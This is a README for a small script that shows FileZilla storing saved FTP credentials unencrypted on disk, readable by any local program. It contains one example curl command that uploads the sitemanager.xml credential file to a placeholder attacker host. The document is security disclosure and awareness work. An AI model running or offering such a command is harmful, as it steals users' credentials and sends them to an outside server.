# Filezilla passwords revealer

![Output of the script](https://i.gyazo.com/877d83a9801fff3c0c39a82df42b921c.png)

This is a small script to demonstrate that the Filezilla credentials are stored **unencrypted** on the local drive and that any program, malware, or even node module running on your machine can trivially access them.  

A single bash command is enough! `curl -F "credentials=@~/.filezilla/sitemanager.xml" attacker.com/credentials.php
` reads the local preference file and uploads it to a remote website.

This script should work with Windows, Linux and Mac. Please [open an issue](https://github.com/christophetd/filezilla-passwords-revealer/issues/new) otherwise.
### Running

- Clone this repository
- `npm install`
- `node index.js`

Or simply copy paste this script in your terminal

```
git clone https://github.com/christophetd/filezilla-passwords-revealer.git
cd filezilla-passwords-revealer
npm install
node index.js
```

Disclaimer: copy pasting bash commands in your terminal [is a terrible practice](https://thejh.net/misc/website-terminal-copy-paste) security-wise

### Resources

- « *[Making FileZilla FTP Client's passwords more secure with TrueCrypt](http://www.trailheadinteractive.com/making_filezilla_ftp_client039s_passwords_more_secure)* ». Note that you should use [VeraCrypt](https://veracrypt.codeplex.com/) instead of TrueCrypt since the latter is now deprecated.
- Some of the numerous feature requests on the official bug tracker : [#5530](https://trac.filezilla-project.org/ticket/5530), [#2935](https://trac.filezilla-project.org/ticket/2935), [#3176](https://trac.filezilla-project.org/ticket/3176)
